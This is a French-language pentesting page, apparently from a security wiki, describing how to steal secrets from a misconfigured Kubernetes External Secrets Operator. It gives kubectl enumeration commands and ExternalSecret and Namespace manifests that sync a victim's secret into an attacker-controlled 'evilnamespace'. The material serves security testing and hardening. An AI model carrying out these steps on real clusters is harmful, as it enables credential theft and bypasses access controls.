# External Secret Operator

**L'auteur original de cette page est** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Cette page donne quelques indications sur la façon dont vous pouvez réussir à voler des secrets d'un ESO mal configuré ou d'une application qui utilise ESO pour synchroniser ses secrets.

## Avertissement

La technique montrée ci-dessous ne peut fonctionner que lorsque certaines conditions sont remplies. Par exemple, cela dépend des exigences nécessaires pour permettre à un secret d'être synchronisé sur un namespace que vous possédez / avez compromis. Vous devez le découvrir par vous-même.

## Prérequis

1. Un accès dans un cluster kubernetes / openshift avec des privilèges d'administrateur sur un namespace
2. Accès en lecture sur au moins ExternalSecret au niveau du cluster
3. Déterminez s'il y a des étiquettes / annotations ou une appartenance à un groupe requises qui permettent à ESO de synchroniser votre secret. Si vous avez de la chance, vous pouvez voler librement tout secret défini.

### Collecte d'informations sur l'existant ClusterSecretStore

En supposant que vous avez un utilisateur qui a suffisamment de droits pour lire cette ressource ; commencez par lister d'abord les _**ClusterSecretStores**_ existants.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeration

Supposons que vous ayez trouvé un ClusterSecretStore nommé _**mystore**_. Continuez en énumérant son externalsecret associé.
```sh
kubectl get externalsecret -A | grep mystore
```
_Cette ressource est limitée à un espace de noms, donc à moins que vous ne sachiez déjà quel espace de noms rechercher, ajoutez l'option -A pour rechercher dans tous les espaces de noms._

Vous devriez obtenir une liste d'externalsecret définis. Supposons que vous ayez trouvé un objet externalsecret appelé _**mysecret**_ défini et utilisé par l'espace de noms _**mynamespace**_. Rassemblez un peu plus d'informations sur le type de secret qu'il contient.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Assembling the pieces

À partir de là, vous pouvez obtenir le nom d'un ou plusieurs noms de secret (comme défini dans la ressource Secret). Vous obtiendrez une sortie similaire à :
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Jusqu'à présent, nous avons :

- Nommer un ClusterSecretStore
- Nom d'un ExternalSecret
- Nom du secret

Maintenant que nous avons tout ce dont nous avons besoin, vous pouvez créer un ExternalSecret (et éventuellement patcher/créer un nouveau Namespace pour respecter les prérequis nécessaires pour synchroniser votre nouveau secret) :
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Après quelques minutes, si les conditions de synchronisation étaient remplies, vous devriez pouvoir voir le secret leaké dans votre espace de noms.
```sh
kubectl get secret leaked_secret -o yaml
```
## Références

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
